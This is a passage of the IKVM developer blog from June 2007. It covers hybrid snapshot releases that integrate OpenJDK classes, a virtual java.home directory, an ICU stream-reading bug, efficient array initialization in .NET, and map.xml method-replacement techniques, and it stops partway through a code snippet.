	<div class="entryBody">
		<P>I'm getting tired of writing the <A HREF="/PermaLink.aspx?guid=03a85316-6639-4f04-b4ba-62ffec1713b4">disclaimers and warnings</A>, but they still apply.</P>
<P>The most important change in this snapshot is that there's now a <I>virtual file system</I> for the java.home directory. This has been a long time coming, but the proverbial straw was the fact that the OpenJDK timezone code reads files from the java.home/lib/zi/ directory (IMHO they really should be using resources for these things).</P>
<P>Currently the virtual java.home directory is <CODE>C:\.virtual-ikvm-home\</CODE> on Windows and <CODE>/.virtual-ikvm-home/</CODE> on Unix, but this is subject to change (please let me know if you have thoughts on this). The only contents in there so far is the /lib/zi/ directory tree and only a few file operations are supported (notably the ones required by the timezone code), but expect that eventually all (read-only) file system operations will be supported and more virtual files to appear in there.</P>
<P><B>Why a Virtual File System Instead Of a Real Java Home Directory?</B></P>
<P>The main reason is that I want IKVM to behave like a .NET library as much as possible. That means it should be possible to install it into the GAC and support the versioning and side-by-side capabilities of .NET, that's very hard to do when you have to manage real directories.</P>
<P>Changes:</P>
<UL>
<LI>OpenJDK: Integrated java.util.spi, java.util.prefs and java.util.logging packages.</LI>
<LI>OpenJDK: Integrated java.text and java.text.spi packages (except for java.text.Bidi class, for which Sun uses native code, so we'll continue to use GNU Classpath's pure Java version.)</LI>
<LI>OpenJDK: Changed build script to include all resources from OpenJDK generated resources.jar.</LI>
<LI>OpenJDK: Integrated java.rmi package.</LI>
<LI>OpenJDK: Changed system/extension class loader creation to make sure that an extension class loader always exists if there is a non-assembly system class loader.</LI>
<LI>OpenJDK: Improved exception handling in java.io.FileDescriptor.</LI>
<LI>OpenJDK: Removed AccessController.doPrivileged() call in Unsafe.fieldOffset(), to work around Mauve brokenness.</LI>
<LI>OpenJDK: Implemented the beginnings of a virtual file system for the java.home directory.</LI>
<LI>Changed JVM.IsUnix to use Environment.OSVersion.Platform.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-hybrid-0.35.2734.zip">ikvmbin-hybrid-0.35.2734.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/27/2007 08:57:35 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8e64505e-ca29-4db1-8a4a-f49100326b75"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8e64505e-ca29-4db1-8a4a-f49100326b75">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 21 June 2007</h2></div>
<div class="newsItems"><a name="a03a85316-6639-4f04-b4ba-62ffec1713b4"></a><div class="entry">
	<h3 class="entryTitle">New Hybrid Snapshot</h3>
	<div class="entryBody">
		<P>Another hybrid snapshot update. Just a reminder again: These snapshots have not been tested extensively and are known to be broken (and are <STRONG>much</STRONG> more broken than the non-hybrid snapshots I used to release). They are only intended to be used for testing and getting a feel of how things are going. If you find a bug specific to this snapshot, please don't file a bug on SourceForge, simply send a message to the ikvm-developers list or to me directly.</P>
<P>I'm not going to list everything that's known to be broken, but I will say that Eclipse 3.2 still runs, so&nbsp;at least some parts&nbsp;do work&nbsp;;-)</P>
<P>This build also includes several GNU Classpath fixes that I haven't yet checked in, so if you're trying to do a hybrid build from cvs you'll end up with something even more broken than this build. [<STRONG>Update</STRONG>: I checked them in.]</P>
<P>Changes:</P>
<UL>
<LI>OpenJDK: Upgraded to OpenJDK bundle b13. 
<LI>OpenJDK: Added more resources. 
<LI>OpenJDK: Integrated java.lang.annotation and java.lang.ref packages. 
<LI>OpenJDK: Integrated java.io and java.util packages. 
<LI>Added -serialver option to ikvmstub that forces stub generator to include serialVersionUID field for all serializable classes (to make Japi results more accurate). 
<LI>Fixed GetParameterAnnotations() to return the correct array length for instancehelper__ methods (static methods that represent instance methods on remapped types). 
<LI>Fixed ikvm.io.InputStreamWrapper.available() to return non-zero when more data is available (as suggested by Mark Reinhold). Removed the NormalizerDataReader specific fix from map.xml. 
<LI>Fixed ikvmstub to better handle private interface implementations. (Fixes System.Web.UI.Control subclassing <A href="http://sourceforge.net/mailarchive/message.php?msg_name=23fc01bb0706200804w29e6ad89s34d1b56cb8f17752@mail.gmail.com">issue</A>).</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-hybrid-0.35.2728.zip">ikvmbin-hybrid-0.35.2728.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/21/2007 07:23:42 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=03a85316-6639-4f04-b4ba-62ffec1713b4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=03a85316-6639-4f04-b4ba-62ffec1713b4">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 19 June 2007</h2></div>
<div class="newsItems"><a name="a309d558f-04e4-4a89-8afd-86948f9f8309"></a><div class="entry">
	<h3 class="entryTitle">Five Years</h3>
	<div class="entryBody">
		<P>Wow. Today it's five years ago that I <A HREF="/PermaLink.aspx?guid=1">started blogging</A> about IKVM. I'd write more, but I'm having too much fun working on integrating the OpenJDK libraries :-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/19/2007 06:32:18 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=309d558f-04e4-4a89-8afd-86948f9f8309"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=309d558f-04e4-4a89-8afd-86948f9f8309">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 14 June 2007</h2></div>
<div class="newsItems"><a name="a23ccb23f-fe8a-44a3-920f-8ac5ef474f08"></a><div class="entry">
	<h3 class="entryTitle">First OpenJDK Bug</h3>
	<div class="entryBody">
		<P>Yesterday I encountered the first OpenJDK "bug". Sun uses IBM's <A href="http://www.icu-project.org/">ICU</A> library for Unicode and Globalization support and it does a couple of <A href="http://bugs.icu-project.org/trac/browser/icu4j/trunk/src/com/ibm/icu/impl/NormalizerDataReader.java#L343">DataInputStream.read(byte[]) calls without checking the return value</A>. On IKVM the InputStream that ClassLoader.getSystemResourceAsStream() returns is an <A href="http://ikvm.cvs.sourceforge.net/ikvm/ikvm/classpath/ikvm/io/InputStreamWrapper.java?revision=1.1&amp;view=markup">ikvm.io.InputStreamWrapper</A> and that always returns 0 from available() when it is wrapping a non-seekable stream and the <A href="http://ikvm.cvs.sourceforge.net/ikvm/ikvm/runtime/common.cs?view=markup#l_51">LZInputStream</A> that decompresses compressed resources is a non-seekable stream. The reason this is significant is that ICU wraps a BufferedInputStream around the InputStreamWrapper and BufferedInputStream uses available() to figure out if it should read more data from the underlying stream if there's still room in the byte array passed in to read(byte[]) after the data from the buffer has been copied. So as long as the underlying stream has an implementation of available() that never returns 0, ICU works fine. I filed a <A href="http://bugs.icu-project.org/trac/ticket/5744">bug</A> report.</P>
<P>Issues like this demonstrate why cloning a large platform is so incredibly difficult. Real world code is bound to have dependencies on implementation details like this. So simply reimplementing a spec isn't sufficient.</P>
<P>For the time being I've added a workaround to map.xml (using the new &lt;replace-method-call /&gt; support) to modify the ICU method to call readFully(byte[]) instead of read(byte[]), but I'm considering rewriting the resource decompression to have available() return the number of bytes still available to read from the stream. There may be other code out there that depends on it.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/14/2007 12:26:19 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=23ccb23f-fe8a-44a3-920f-8ac5ef474f08"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=23ccb23f-fe8a-44a3-920f-8ac5ef474f08">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 13 June 2007</h2></div>
<div class="newsItems"><a name="af61a7556-e7e9-4bc9-9b63-399d16e61346"></a><div class="entry">
	<h3 class="entryTitle">New Hybrid Snapshot</h3>
	<div class="entryBody">
		<P>A new snapshot. I integrated all classes in the java.lang package (but not the sub-packages) and this means I have now resolved most VM/Library initialization issues that I was a bit worried about before embarking on this. I had to include one new hackish (or AOP if you will) feature in map.xml: The ability to replace method invocations with arbitrary CIL code sequences. This was in particular necessary to "comment out" the <CODE>loadLibrary("zip")</CODE> call in <CODE>System.initializeSystemClass()</CODE>. Here's what that looks like in map.xml:</P>
<P><CODE><FONT color=#0000ff>&lt;</FONT><FONT color=#a31515>class</FONT> <FONT color=#ff0000>name</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>java.lang.System</FONT>"<FONT color=#0000ff>&gt;</FONT><BR>&nbsp; <FONT color=#0000ff>&lt;</FONT><FONT color=#a31515>method</FONT> <FONT color=#ff0000>name</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>initializeSystemClass</FONT>" <FONT color=#ff0000>sig</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>()V</FONT>"<FONT color=#0000ff>&gt;</FONT><BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>&lt;</FONT><FONT color=#a31515>replace-method-call</FONT> <FONT color=#ff0000>class</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>java.lang.System</FONT>" <FONT color=#ff0000>name</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>loadLibrary</FONT>" <FONT color=#ff0000>sig</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>(Ljava.lang.String;)V</FONT>"<FONT color=#0000ff>&gt;</FONT><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>&lt;</FONT><FONT color=#a31515>code</FONT><FONT color=#0000ff>&gt;</FONT><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>&lt;</FONT><FONT color=#a31515>pop </FONT><FONT color=#0000ff>/&gt;</FONT><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>&lt;/</FONT><FONT color=#a31515>code</FONT><FONT color=#0000ff>&gt;</FONT><BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>&lt;/</FONT><FONT color=#a31515>replace-method-call</FONT><FONT color=#0000ff>&gt;</FONT><BR>&nbsp; <FONT color=#0000ff>&lt;/</FONT><FONT color=#a31515>method</FONT><FONT color=#0000ff>&gt;</FONT><BR><FONT color=#0000ff>&lt;/</FONT><FONT color=#a31515>class</FONT><FONT color=#0000ff>&gt;</FONT></CODE></P>
<P>This simply means that all System.loadLibrary() invocations in System.initializeClass() will be replaced with a pop instruction (to discard the string argument).</P>
<P>Changes:</P>
<UL>
<LI>OpenJDK: Integrated java.lang package.. 
<LI>OpenJDK: Integrated java.util.regex package. 
<LI>OpenJDK: Integrated java.text.Normalizer and support classes. 
<LI>OpenJDK: New StringHelper.java based on OpenJDK's String.java. 
<LI>OpenJDK: Implemented using the entry assembly's class loader as system class loader. 
<LI>OpenJDK: Replaced zip library loading hack with "replace-method-call" hack. 
<LI>OpenJDK: Implemented the hooks to set the system class loader to the entry assembly's class loader if java.class.path and java.ext.dirs properties aren't set. 
<LI>OpenJDK: Various fixes. 
<LI>Added leave CIL opcode support to remapper. 
<LI>Added support for replacing constructor and static initializer method bodies in map.xml. 
<LI>Added support for locally (i.e. per method) replacing method calls in map.xml. 
<LI>Added optimization to ikvmc for large string literals that are only used to call .toCharArray() on.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-hybrid-0.35.2720.zip">ikvmbin-hybrid-0.35.2720.zip</A>.</P></FONT></FONT></FONT></FONT>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/13/2007 08:35:28 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f61a7556-e7e9-4bc9-9b63-399d16e61346"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f61a7556-e7e9-4bc9-9b63-399d16e61346">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 12 June 2007</h2></div>
<div class="newsItems"><a name="a33aed348-a990-40bd-9a01-7b903b918b55"></a><div class="entry">
	<h3 class="entryTitle">Array Initialization</h3>
	<div class="entryBody">
		<P>One of the many limitations of the Java class file format is that it doesn't support an efficient way of initializing an array. Take the following class for example:</P>
<P><CODE><FONT color=#0000ff>class</FONT> Foo<BR>{<BR>&nbsp; <FONT color=#0000ff>private static final int</FONT>[] values = { 1, 2, 3, 4 };<BR>}</CODE></P>
<P>This looks harmless enough, but it is compiled almost exactly the same as this:</P>
<P><CODE><FONT color=#0000ff>class</FONT> Foo<BR>{<BR>&nbsp; <FONT color=#0000ff>private static final int</FONT>[] values;<BR><BR>&nbsp; <FONT color=#0000ff>static</FONT><BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>int</FONT>[] temp = <FONT color=#0000ff>new int</FONT>[4];<BR>&nbsp;&nbsp;&nbsp; temp[0] = 1;<BR>&nbsp;&nbsp;&nbsp; temp[1] = 2;<BR>&nbsp;&nbsp;&nbsp; temp[2] = 3;<BR>&nbsp;&nbsp;&nbsp; temp[3] = 4;<BR>&nbsp;&nbsp;&nbsp; values = temp;<BR>&nbsp; }<BR>}</CODE></P>
<P>If you have an array with a few thousand entries, this is starting to look pretty inefficient. Here's how C# compiles the equivalent code (but with an array with more elements, for small arrays the C# compiler does the same as the javac):</P>
<P><CODE><FONT color=#0000ff>using </FONT>System.Runtime.CompilerServices;<FONT color=#0000ff><BR><BR>class</FONT> Foo<BR>{<BR>&nbsp; <FONT color=#0000ff>private static readonly int</FONT>[] values;<BR><BR>&nbsp; <FONT color=#0000ff>static </FONT>Foo()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>int</FONT>[] temp = <FONT color=#0000ff>new int</FONT>[128];<BR>&nbsp;&nbsp;&nbsp; RuntimeHelpers.InitializeArray(temp, LDTOKEN($$field-0))<BR>&nbsp;&nbsp;&nbsp; values = temp;<BR>&nbsp; }<BR>}</CODE></P>
<P>This is pseudo C#, because there's no C# language construct that allows you to directly load a field's <CODE><A href="http://msdn2.microsoft.com/en-us/library/system.runtimefieldhandle.aspx">RuntimeFieldHandle</A></CODE> as the <CODE>ldtoken</CODE> CIL instruction does. What happens here is that the C# compiler emits a global read-only data field and then uses <CODE><A href="http://msdn2.microsoft.com/en-us/library/system.runtime.compilerservices.runtimehelpers.initializearray.aspx">RuntimeHelpers.InitializeArray()</A></CODE> to copy this field into the array. If you're on a little endian machine, this is simply a memcpy (after checking that the sizes match).</P>
<P>On occasion I've toyed with the idea of making ikvmc recognize array initialization sequences and then converting them into this more efficient form. The reason that I never got around to it is that many people know that array initialization is inefficient and use a workaround: String literals.</P>
<P>Here's a fragment from OpenJDK's <CODE>java.lang.CharacterData00</CODE> class:</P>
<P><CODE><FONT color=#0000ff>static final char</FONT> X[] = (<BR>&nbsp; <FONT color=#7d3302>"\000\020\040\060\100\120\140\160</FONT>...<BR>&nbsp; ...<BR>&nbsp; ...<BR>&nbsp; ...<FONT color=#7d3302>\u1110\u1120\u1130"</FONT>).toCharArray();</CODE></P>
<P>I've omitted most of the data, but the string has 2048 characters (and it's not the only one in this class). String literals can be efficiently stored in the class file format, so this is more efficient than explicitly initializing the array elements.</P>
<P>However, on IKVM there's a downside to this approach. Java requires that all string literals are interned and on .NET the string intern table keeps strong references to the interned strings (the Sun JVM uses weak references to keep track of interned strings). So that means that the 2048 character string above that is only used once will stay in memory for the entire lifetime of the application.</P>
<P>Fortunately, this particular scenario is easily detected in the bytecode compiler and can be optimized to use <CODE>RuntimeHelper.InitializerArray()</CODE>.</P>
<P>Unfortunately, it turns out that the Reflection.Emit API that takes care of creating these read-only global data fields is a little too helpful and hence broken. What I didn't mention earlier is that these read-only global data fields need to have a type and that type has to be an explicit layout value type of the right size. <CODE><A href="http://msdn2.microsoft.com/en-us/library/system.reflection.emit.modulebuilder.defineinitializeddata.aspx">ModuleBuilder.DefineInitializedData()</A></CODE> automatically defines this type, but instead of making it private it creates a public type.</P>
<P>The type created by <CODE>ModuleBuilder.DefineInitializedData()</CODE> is named <CODE>$ArrayType$&lt;n&gt;</CODE> where &lt;n&gt; is the size of the value in bytes. The size is encoded in the type name to make it easy to reuse the same type for other fields that have the same size. It turns out we can abuse this knowledge to work around the limitations of <CODE>ModuleBuilder.DefineInitializedData()</CODE> by pre-creating the value type with the right name. Now we can have full control over the properties of the generated type (as long as it's compatible with the requirements of the read-only global field, of course).</P>
<P>Final note: While writing this blog entry I found that Mono's implementation of RuntimeHelpers.InitializeArray() <A href="http://bugzilla.ximian.com/show_bug.cgi?id=81860">leaves something to be desired</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/12/2007 08:45:48 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=33aed348-a990-40bd-9a01-7b903b918b55"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=33aed348-a990-40bd-9a01-7b903b918b55">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 04 June 2007</h2></div>
<div class="newsItems"><a name="a1d6c7b8e-f0bb-4c1a-be11-f51116c44326"></a><div class="entry">
	<h3 class="entryTitle">OpenJDK Library/VM Integration</h3>
	<div class="entryBody">
		<P>In <A HREF="/CommentView.aspx?guid=e6e4a958-b179-4361-b053-502be42b0c51">Merging the First OpenJDK Code and Another x64 CLR Bug</A> I briefly mentioned the three different approaches that are available for integrating the OpenJDK classes with IKVM:</P>
<OL>
<LI>Use existing native interface</LI>
<LI>Use map.xml tricks</LI>
<LI>Change the code (i.e. fork a specific source file)</LI></OL>
<P>This triggered a couple of questions in the comments.</P>
<P>Morten asked:</P>
<DIV style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">
<P>about your work of [i]ntegrating the whole of OpenJDK and [y]our 3 options. Could you provide more details? From what you write, it sounds like using aspectj to inject annotations could be useful. Codegeneration might also be useful?</P></DIV>
<P>Yes, that's essentially what option 2 is. The map.xml infrastructure allows me to add methods and fields to existing classes, or allows me to replace method bodies.</P>
<P>Albert Strasheim asked:</P>
<DIV style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">
<P>It's too bad that the Sun and Classpath code aren't compatible down to the native methods called by the pure Java code. </P></DIV>
<P>As Andrew pointed out, it would not have been possible or practical to reverse engineer the Sun native interface. Besides that, the Sun and GNU Classpath libraries have very different goals, so it actually makes a lot of sense for the interfaces to differ.</P>
<DIV style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">
<P>I figured that you'd go the "native methods in C#" route, so I'd be interested to know why you think that the "IKVM specific modifications" route is cleaner and more efficient (efficient in terms of performance or time to implement?). </P></DIV>
<P>It would seem that implementing the native methods in C# would be the best solution, but that's not always the case. Hopefully that will become clear below.</P><B>Examples</B>
<P></P>
<P>Let's look at some examples and the downsides and cost associated with each of the three options:</P>
<P>1. Use existing native interface</P>
<P>In terms of long term development cost, this is easily the best option. Once you understand the ikvmc native method mapping that is used by the class library, it is very easy to find to corresponding native method. Sun is not very likely to change the native method semantics without also modifying the method name or signature. When a new native method is added, the build process will fail due to the fact that the new native method isn't implemented (and hence generates an unverifiable JNI method stub).</P>
<P>In terms of runtime performance, this method can be very efficient, but only if the method parameters contains all the required data to work on, or if the data can be easily obtained in another efficient way. This is often not the case, because many of the Sun native methods use JNI reflection to access private fields in the object. Here are two real world examples, one where the native methods works really well and another one where it's not as efficient as I'd like:</P><CODE>
<P><FONT color=#0000ff>namespace </FONT>IKVM.NativeCode.java.lang.reflect<BR>{<BR>&nbsp; <FONT color=#0000ff>public sealed class </FONT>Array<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public static bool </FONT>getBoolean(<FONT color=#0000ff>object </FONT>arrayObj, <FONT color=#0000ff>int </FONT>index)<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>if </FONT>(arrayObj == <FONT color=#0000ff>null</FONT>)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>throw new </FONT><FONT color=#2b91af>jlNullPointerException</FONT>();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>bool</FONT>[] arr = arrayObj <FONT color=#0000ff>as bool</FONT>[];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>if </FONT>(arr != <FONT color=#0000ff>null</FONT>)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>if </FONT>(index &lt; 0 || index &gt;= arr.Length)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>throw new </FONT><FONT color=#2b91af>jlArrayIndexOutOfBoundsException</FONT>();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return </FONT>arr[index];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>throw new </FONT><FONT color=#2b91af>jlIllegalArgumentException</FONT>(<FONT color=#7d3302>"argument type mismatch"</FONT>);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>}</P></CODE>
<P>Clearly this is very efficient (and it makes you wonder why it's a native method at all). Here's one that's less efficient:</P>
<P><CODE><FONT color=#0000ff>namespace </FONT>IKVM.NativeCode.java.lang<BR>{<BR>&nbsp; <FONT color=#0000ff>public sealed class </FONT>Class<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public static bool </FONT>isInterface(<FONT color=#0000ff>object </FONT>thisClass)<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return </FONT><FONT color=#2b91af>TypeWrapper</FONT>.FromClass(thisClass).IsInterface;<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>}</CODE></P>
<P>The <CODE>thisClass</CODE> parameter is a reference to the <CODE>java.lang.Class</CODE> object, but the VM wants to use its internal representation of a class (<CODE>TypeWrapper</CODE>), so here I need to use <CODE>TypeWrapper.FromClass()</CODE> to get the corresponding <CODE>TypeWrapper</CODE> object. Currently that's implemented by using reflection to access a private field in <CODE>java.lang.Class</CODE> (that was added through map.xml).</P>
<P>To contrast, here's the equivalent method for use with the GNU Classpath library:</P>
<P><CODE><FONT color=#0000ff>namespace </FONT>IKVM.NativeCode.java.lang<BR>{<BR>&nbsp; <FONT color=#0000ff>public sealed class </FONT>VMClass<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public static bool </FONT>IsInterface(<FONT color=#0000ff>object </FONT>wrapper)<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return </FONT>((<FONT color=#2b91af>TypeWrapper</FONT>)wrapper).IsInterface;<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>}</CODE></P>
<P>Here only a downcast is required, because <CODE>Class.isInterface()</CODE> calls <CODE>VMClass.isInterface()</CODE>, which reads the <CODE>vmdata</CODE> field from <CODE>Class</CODE> and passes that to the native <CODE>IsInterface</CODE> method.</P>
<P>2. Use map.xml tricks</P>
<P>This is very powerful, but also much more expensive because it is much less obvious what's going on. In the case of a native method that is implemented, if you can't find it in the C# code, you'll probably eventually find it in map.xml, but when replacing an existing method it's very easy to miss the fact that the method is replaced. I've used method replacement in <CODE>java.lang.ClassLoader</CODE> to make bootstrap resource loading work. <CODE>ClassLoader</CODE> has two private methods <CODE>getBootstrapResource()</CODE> and <CODE>getBootstrapResources()</CODE> that are used to load resources from the boot class path. These methods are implemented by parsing the sun.boot.class.path system property and then using internal classes to load from these jars or directories. Obviously that won't do for IKVM, because the boot classes and resources are contained in the core library .NET assembly (currently named IKVM.Hybrid.GNU.Classpath.OpenJDK.dll). So I've had to replace these two methods:</P><CODE>
<P>&lt;<FONT color=#a31515>class </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>java.lang.ClassLoader</FONT>"&gt;<BR>&nbsp; &lt;<FONT color=#a31515>field </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>wrapper</FONT>" <FONT color=#ff0000>sig</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>Ljava.lang.Object;</FONT>" <FONT color=#ff0000>modifiers</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>private</FONT>" /&gt;<BR>&nbsp; &lt;<FONT color=#a31515>method</FONT> <FONT color=#ff0000>name</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>getBootstrapResource</FONT>" <FONT color=#ff0000>sig</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>(Ljava.lang.String;)Ljava.net.URL;</FONT>"&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;<FONT color=#a31515>body</FONT>&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<FONT color=#a31515>ldarg_0 </FONT>/&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<FONT color=#a31515>call </FONT><FONT color=#ff0000>class</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>java.lang.LangHelper</FONT>"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#ff0000>name</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>getBootstrapResource</FONT>" <FONT color=#ff0000>sig</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>(Ljava.lang.String;)Ljava.net.URL;</FONT>" /&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<FONT color=#a31515>ret </FONT>/&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/<FONT color=#a31515>body</FONT>&gt;<BR>&nbsp; &lt;/<FONT color=#a31515>method</FONT>&gt;<BR>&nbsp; &lt;<FONT color=#a31515>method </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>getBootstrapResources</FONT>" <FONT color=#ff0000>sig</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>(Ljava.lang.String;)Ljava.util.Enumeration;</FONT>"&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;<FONT color=#a31515>body</FONT>&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<FONT color=#a31515>ldarg_0 </FONT>/&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;<FONT color=#a31515>call </FONT><FONT color=#ff0000>class</FONT><FONT color=#0000ff>=</FONT>"<FONT color=#0000ff>java.lang.LangHelper</FONT>"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#ff0000>name</FONT><FONT color=#0000ff>=</FONT>"<FONT 